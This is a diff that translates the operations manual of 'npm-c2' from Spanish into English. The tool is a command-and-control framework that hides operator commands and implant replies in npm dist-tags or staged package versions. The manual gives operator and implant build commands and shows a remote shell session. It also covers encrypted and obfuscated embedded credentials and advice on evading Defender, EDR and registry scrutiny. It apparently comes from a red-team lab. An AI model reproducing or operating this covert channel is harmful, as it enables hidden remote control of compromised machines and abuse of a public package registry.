@@ -1,46 +1,46 @@
-# npm-c2 — manual de operación
+# npm-c2 — operations manual
 
-> Nota: este manual describe el transporte por dist-tags (v1.x). npm cerró esa
-> escritura para los tokens de automatización; el transporte actual es staging y
-> está documentado en [README.md](README.md).
+> Note: the dist-tag sections describe the v1.x transport, which npm closed to
+> automation tokens. The staging transport at the end of this file is what still
+> works, and it is the one documented in [README.md](README.md).
 
-Canal de mando y control sobre los dist-tags de un paquete npm. El operador
-escribe tags; el implante los lee, ejecuta y responde.
+Command and control over a package's npm dist-tags. The operator writes tags;
+the implant reads them, runs the command and answers.
 
-## Modelo mental
+## Mental model
 
 ```
-operador                    registro npm                 implante
+operator                    npm registry                  implant
    |                            |                           |
    |-- PUT x64-<gid>-... ------>|                           |
-   |    (comando cifrado)       |<---- GET cada N s --------|
-   |                            |      (lee el mapa)        |
-   |                            |                           |-- ejecuta
+   |    (encrypted command)     |<---- GET every N s -------|
+   |                            |      (reads the map)      |
+   |                            |                           |-- executes
    |<-- GET arm64-<gid>-... ----|<---- PUT arm64-... -------|
-   |    (salida cifrada)        |                           |
-   |-- DELETE (si hay permiso) >|                           |
+   |    (encrypted output)      |                           |
+   |-- DELETE (if allowed) ---->|                           |
 ```
 
-Cada tag es un trozo de mensaje en base64url. Prefijos:
+Every tag is a slice of a base64url message. Prefixes:
 
-| Prefijo | Dirección | Contenido |
+| Prefix | Direction | Content |
 |---|---|---|
-| `x64-`   | operador → implante | comando |
-| `arm64-` | implante → operador | respuesta |
-| `ia32-`  | implante → operador | heartbeat (host\|user\|pid\|unix) |
+| `x64-`   | operator -> implant | command |
+| `arm64-` | implant -> operator | reply |
+| `ia32-`  | implant -> operator | heartbeat (host\|user\|pid\|unix) |
 
-## Arrancar el operador
+## Starting the operator
 
 ```bash
-cd /home/ika/lab/npm-c2 && source .venv/bin/activate
+cd npm-c2 && source .venv/bin/activate
 
-npm-c2 operator -p <paquete> -t <token> --passphrase '<pass>' shell
+npm-c2 operator -p <package> -t <token> --passphrase '<pass>' shell
 ```
 
-Consola interactiva. Escribe comandos, recibe salida.
+Interactive console. Type a command, get the output back.
 
 ```
-[*] interactive channel on runtime-metrics-relay
+[*] interactive channel on example-pkg
 [*] type :help for meta-commands, :quit to detach
 [*] waiting up to 120s per command, polling every 5s
 c2> whoami
@@ -50,230 +50,232 @@ KALI\ika
 c2>
 ```
 
-## Meta-comandos de la shell
+## Shell meta-commands
 
-| Comando | Efecto |
+| Command | Effect |
 |---|---|
-| `:clients` | quién está conectado: host, user, pid, última vez |
-| `:stats` | cuántos tags pendientes / resultados / heartbeats |
-| `:wait <s>` | timeout por comando (antes estaba roto) |
-| `:interval <s>` | cada cuánto pollea mientras espera |
-| `:poll` | vuelca todos los resultados presentes |
-| `:beacons` | heartbeats en crudo |
-| `:clean` | borra los tags del canal |
-| `:quit` | salir; el implante sigue polleando |
+| `:clients` | who is connected: host, user, pid, last seen |
+| `:stats` | pending tags / results / heartbeats |
+| `:wait <s>` | per-command timeout |
+| `:interval <s>` | how often to poll while waiting |
+| `:poll` | dump every result currently present |
+| `:beacons` | raw heartbeats |
+| `:clean` | delete this channel's tags |
+| `:quit` | leave; the implant keeps polling |
 
-## Subcomandos sueltos
-
-```bash
-npm-c2 operator -p PKG -t TOK run "whoami"      # un comando, espera salida
-npm-c2 operator -p PKG -t TOK task --cmd "..."  # encola sin esperar
-npm-c2 operator -p PKG -t TOK clients            # clientes conectados
-npm-c2 operator -p PKG -t TOK stats              # estado del canal
-npm-c2 operator -p PKG -t TOK watch --interval 5 # escucha continua
-npm-c2 operator -p PKG -t TOK poll               # resultados pendientes
-npm-c2 operator -p PKG -t TOK clean --all        # borra tags
-npm-c2 doctor -p PKG -t TOK                      # comprueba token y permisos
-```
-
-## Flags globales
-
-```
---passphrase '<pass>'   obligatorio si el implante cifra
---api-base <url>        registro alternativo (o NPMC2_API_BASE)
-                        TAG_VALUE por entorno: NPMC2_TAG_VALUE=0.0.0-stage
-```
-
-`TAG_VALUE` es la versión a la que apuntan los tags. **Debe existir** en el
-paquete o npm responde 400.
-
-## Compilar el implante
+## Standalone subcommands
 
 ```bash
-# contra npmjs
+npm-c2 operator -p PKG -t TOK run "whoami"      # one command, wait for output
+npm-c2 operator -p PKG -t TOK task --cmd "..."  # queue without waiting
+npm-c2 operator -p PKG -t TOK clients            # connected clients
+npm-c2 operator -p PKG -t TOK stats              # channel state
+npm-c2 operator -p PKG -t TOK watch --interval 5 # continuous listen
+npm-c2 operator -p PKG -t TOK poll               # pending results
+npm-c2 operator -p PKG -t TOK clean --all        # delete tags
+npm-c2 doctor -p PKG -t TOK                      # check token and permissions
+```
+
+## Global flags
+
+```
+--passphrase '<pass>'   required if the implant encrypts
+--api-base <url>        alternative registry (or NPMC2_API_BASE)
+                        TAG_VALUE through the environment: NPMC2_TAG_VALUE=0.0.0-stage
+```
+
+`TAG_VALUE` is the version the tags point at. It **must exist** in the package,
+or npm answers 400.
+
+## Building the implant
+
+```bash
+# against npmjs
 python3 native/build_go.py -p PKG -t npm_xxx --passphrase '<pass>' \
   --interval 60 --jitter 20
 
-# contra un registro propio
+# against your own registry
 python3 native/build_go.py -p PKG -t TOK --api-base http://10.0.0.5:4874 \
   --passphrase '<pass>' --interval 30 --jitter 5
 
-# opciones
---tag-value 0.0.0-stage   versión destino cuando el paquete no está en 1.0.0
---upx                     ~34% menos tamaño, pero UPX0/UPX1 visibles y
-                          Defender lo marca; no usar con EDR delante
---32                      también compila 386
+# options
+--tag-value 0.0.0-stage   target version when the package is not on 1.0.0
+--upx                     ~34% smaller, but UPX0/UPX1 are visible and
+                          Defender flags it; do not use it in front of an EDR
+--32                      also builds 386
 ```
 
-El binario lleva todo incrustado: se ejecuta sin argumentos en el objetivo.
+The binary carries everything embedded: it runs with no arguments on the target.
 
-## Seguridad del canal
+## Channel security
 
-**Sin cifrado, cualquiera lee el canal.** Los dist-tags de npmjs son públicos:
-un simple GET sin token devuelve el mapa, y base64 se decodifica en un
-comando. Verificado: se leían comandos como `whoami` en claro.
+**Without encryption anyone reads the channel.** npmjs dist-tags are public: a
+plain GET with no token returns the map, and base64 decodes into a command.
+Verified: commands like `whoami` were readable in clear.
 
-Con `--passphrase`, cada payload va con AES-256-GCM:
+With `--passphrase` every payload uses AES-256-GCM:
 
-- clave derivada con HKDF-SHA256
-- nonce aleatorio por payload
-- AAD ligado al nombre del paquete (impide reutilizar el cifrado en otro canal)
+- key derived with HKDF-SHA256
+- random nonce per payload
+- AAD bound to the package name, so a ciphertext cannot be replayed elsewhere
 
-La passphrase se incrusta ofuscada con el mismo esquema que el token, así que
-`strings` sobre el binario no revela ninguna de las dos. Comprobado.
+The passphrase is embedded obfuscated with the same scheme as the token, so
+`strings` on the binary reveals neither. Verified.
 
-**Compresión.** Un tag lleva ~174 bytes. Comprimir antes de cifrar convierte
-1,3 KB de salida de 8 tags en 1, y 9 KB en 1 tag en lugar de 71. Un mapa más
-pequeño es lo que mantiene barato cada poll.
+**Compression.** One tag holds ~174 bytes. Compressing before encrypting turns
+1.3 KB of output (8 tags) into one, and 9 KB into one tag instead of 71. A
+smaller map is what keeps every poll cheap.
 
-## Comportamiento del borrado
+## Delete behaviour
 
-Tras leer la salida, el operador borra los tags que usó. Pero depende del
-registro:
+After reading the output the operator deletes the tags it used. Whether that
+works depends on the registry:
 
-| Registro | PUT | DELETE | Resultado |
+| Registry | PUT | DELETE | Result |
 |---|---|---|---|
-| Verdaccio propio | sí | sí | mapa limpio tras cada comando |
-| npmjs, token bypass-2FA | depende | **403** | se intenta una vez y se desactiva |
+| Own Verdaccio | yes | yes | clean map after every command |
+| npmjs, bypass-2FA token | depends | **403** | tried once, then disabled |
 
-En npm no reintenta: un 403 desactiva el borrado para el resto de la sesión.
-Si sigue martilleando, gasta una petición fallida por comando, y ese patrón
-es exactamente lo que llama la atención sobre un paquete.
+Against npm it does not retry: a 403 disables deletion for the rest of the
+session. Hammering it spends a failed request per command, and that pattern is
+exactly what draws attention to a package.
 
-`clean_tags.py` sirve para limpiar a mano:
+`clean_tags.py` cleans by hand:
 
 ```bash
 ./clean_tags.py -p PKG -t TOK              # dry run
-./clean_tags.py -p PKG -t TOK --apply      # borra de verdad
+./clean_tags.py -p PKG -t TOK --apply      # actually deletes
 ./clean_tags.py -p PKG -t TOK --base http://127.0.0.1:4874 --apply
 ```
 
-## Coste por poll
+## Cost per poll
 
-Medido contra npmjs real:
-
-```
-latencia             ~260 ms por lectura
-ETag / 304           no existe en la ruta dist-tags
-cache CDN            cf-cache-status: DYNAMIC
-rate limit           3 req/s sin throttling
-coste por tag        ~25 bytes
-```
-
-Y como npm no borra, el mapa crece. Con 62 tags un poll son 1,6 KB; con 200,
-22x el coste de uno vacío. El intervalo hay que elegirlo por presupuesto:
+Measured against the real npmjs:
 
 ```
-intervalo   polls/día   GET/día   MB/día
+latency              ~260 ms per read
+ETag / 304           does not exist on the dist-tags route
+CDN cache            cf-cache-status: DYNAMIC
+rate limit           3 req/s without throttling
+cost per tag         ~25 bytes
+```
+
+And since npm does not delete, the map grows. With 62 tags a poll is 1.6 KB;
+with 200 it is 22x the cost of an empty one. Pick the interval by budget:
+
+```
+interval   polls/day   GET/day   MB/day
       60s        1440      1440     2.32
      300s         288       288     0.46
     1800s          48        48     0.08
 ```
 
-## Verdaccio propio
+## Own Verdaccio
 
 ```bash
-cd /home/ika/lab/npmreg
+cd npmreg
 node_modules/.bin/verdaccio --config ./config.yaml   # :4873
-python3 guard.py                                     # :4874 (bloquea /-/user/)
+python3 guard.py                                     # :4874 (blocks /-/user/)
 ```
 
-Apunta siempre el implante al **4874**, no al 4873: el guard cierra el
-registro de usuarios, porque Verdaccio 7 ignora `max_users` para eso
-(probado con -1 y 0).
+Always point the implant at **4874**, not 4873: the guard closes user
+registration, because Verdaccio 7 ignores `max_users` for that (tested with -1
+and 0).
 
-El proceso se renombra a "npm-c2 relay" (viene de `web.title`), así que
-`pkill -f verdaccio` no lo encuentra. Usa `pkill -f "npm-c2 relay"`.
+The process renames itself to "npm-c2 relay" (from `web.title`), so
+`pkill -f verdaccio` does not find it. Use `pkill -f "npm-c2 relay"`.
 
 ## Tests
 
 ```bash
 for t in test_bugs test_e2e test_standalone test_operational test_engagement \
          test_crypto_interop test_encrypted_channel test_compression test_wipe; do
-  .venv/bin/python tests/$t.py || echo "FALLO $t"
+  .venv/bin/python tests/$t.py || echo "FAIL $t"
 done
 .venv/bin/python -m npm_c2 --self-test
 ```
 
-## Limitaciones conocidas
+## Known limitations
 
-- **Token granular bypass-2FA en npm**: escribe tags solo mientras npm lo
-  permita, no puede borrar (403) ni crear paquetes (`E_STAGE_REQUIRED`). Para
-  publicar hace falta `npm stage publish` + `npm stage approve` con OTP
-  interactivo, o un token clásico read-write.
-- **El mapa no se puede acotar** en npm: el payload viaja en el *nombre* del
-  tag y solo se puede sobrescribir el *valor* (que debe ser una versión
-  existente). No hay anillo de slots posible.
-- **HTTP en claro** contra Verdaccio: si el tráfico cruza una red no
-  confiable, pon TLS delante.
+- **Granular bypass-2FA token on npm**: writes tags only while npm allows it,
+  cannot delete (403) and cannot create packages (`E_STAGE_REQUIRED`). To
+  publish you need `npm stage publish` + `npm stage approve` with an
+  interactive OTP, or a classic read-write token.
+- **The map cannot be bounded** on npm: the payload travels in the *tag name*
+  and only the *value* can be overwritten (and it must be an existing version).
+  No slot ring is possible.
+- **Plain HTTP** against Verdaccio: if the traffic crosses an untrusted network,
+  put TLS in front.
 
-## Transporte por staging (npmjs cuando dist-tags ya no escribe)
+## Staging transport (npmjs once dist-tags stop writing)
 
-npm retiró los tokens clásicos y quitó la escritura directa a los granulares
-con `bypass_2fa`. Medido contra registry.npmjs.org:
+npm retired classic tokens and removed direct writes for granular tokens with
+`bypass_2fa`. Measured against registry.npmjs.org:
 
 ```
 PUT  /-/package/<pkg>/dist-tags/<tag>     -> 403  (automation token)
-POST /-/stage/package/<pkg>               -> 201  (funciona)
+POST /-/stage/package/<pkg>               -> 201  (works)
 ```
 
-El staging es la única vía de escritura que npm sigue permitiendo a la
-automatización, y es a la que ellos mismos dicen que hay que moverse para
-2027. Así que el canal puede montarse sobre versiones staged.
+Staging is the only write path npm still allows to automation, and it is the
+one they themselves say to move to by 2027. So the channel can ride staged
+versions.
 
-### Cómo se transporta
+### How it is carried
 
-El registro solo devuelve la **versión** al lector, así que el payload va ahí:
+The registry only gives the reader back the **version**, so the payload lives
+there:
 
 ```
-0.0.0-<canal>.<h><seq>.<tipo>.<payload>
+0.0.0-<channel>.<h><seq>.<kind>.<payload>
 
-canal   4 chars, primero a-f  (nunca parece numérico)
-seq     "h" + 6 hex           (prefijo alfabético: los ceros a la izquierda
-                               son legales y el campo tiene ancho fijo)
-tipo    c comando | r respuesta
-payload base32 A-Z2-7         (sin 0/1, luego nunca rompe la regla semver
-                               del cero a la izquierda; 5 bits por char)
+channel   4 chars, first one a-f  (never looks numeric)
+seq       "h" + 6 hex             (alphabetic prefix: leading zeros are legal
+                                   and the field keeps a fixed width)
+kind      c command | r reply
+payload   base32 A-Z2-7           (no 0/1, so it never trips the semver
+                                   leading-zero rule; 5 bits per char)
 ```
 
-Restricciones de semver que obligaron a este diseño (medidas, no supuestas):
+Semver restrictions that forced this design (measured, not assumed):
 
-- longitud total de la versión < ~250 chars (238 vale, 259 se rechaza)
-- el prerelease solo admite `[0-9A-Za-z.-]`; **el guion bajo se rechaza**
-- un identificador todo numérico no puede empezar por cero
+- total version length < ~250 chars (238 accepted, 259 rejected)
+- the prerelease only accepts `[0-9A-Za-z.-]`; **underscore is rejected**
+- an all-numeric identifier cannot start with zero
 
-Capacidad: ~227 chars base32 ≈ **141 bytes por versión**, antes de comprimir.
+Capacity: ~227 base32 chars, about **141 bytes per version**, before
+compression.
 
-### Uso
+### Usage
 
 ```bash
-# operador
+# operator
 npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>' "whoami"
 
-# consola
+# console
 npm-c2 stage -p <pkg> -t <token> -c f00d --passphrase '<pass>'
 
-# implante
+# implant
 python3 native/build_go.py -p <pkg> -t <token> --stage-chan f00d \
   --passphrase '<pass>' --interval 60
 ```
 
-### Diferencias con el canal de dist-tags
+### Differences from the dist-tag channel
 
 | | dist-tags | staging |
 |---|---|---|
-| Escritura | 403 con token bypass-2fa | **funciona** |
-| Lectura | pública, sin token | **requiere token** |
-| Visible en `npm view` | sí (packument) | no |
-| Borrado | 403 | 401 (pide OTP) |
-| Basura | tags que crecen | versiones staged que crecen |
+| Write | 403 with a bypass-2FA token | **works** |
+| Read | public, no token | **requires a token** |
+| Visible in `npm view` | yes (packument) | no |
+| Delete | 403 | 401 (asks for an OTP) |
+| Garbage | tags that grow | staged versions that grow |
 
-El intercambio es explícito: ganas escritura, pero **el implante lleva el
-token** porque `GET /-/stage` da 401 sin él. En dist-tags la lectura era
-anónima.
+The trade is explicit: you gain the write, but **the implant carries the
+token**, because `GET /-/stage` answers 401 without it. On dist-tags reading
+was anonymous.
 
-### Limpieza
+### Cleanup
 
-No hay API de borrado: cada mensaje deja una versión staged. Se limpian a
-mano desde npmjs.com → Staged Packages → Reject. Antes de un engagement,
-usa un canal nuevo (`-c`) para no arrastrar el histórico.
+There is no delete API: every message leaves a staged version behind. Clean
+them by hand on npmjs.com -> Staged Packages -> Reject. Before an engagement,
+use a fresh channel (`-c`) so you do not drag the history along.
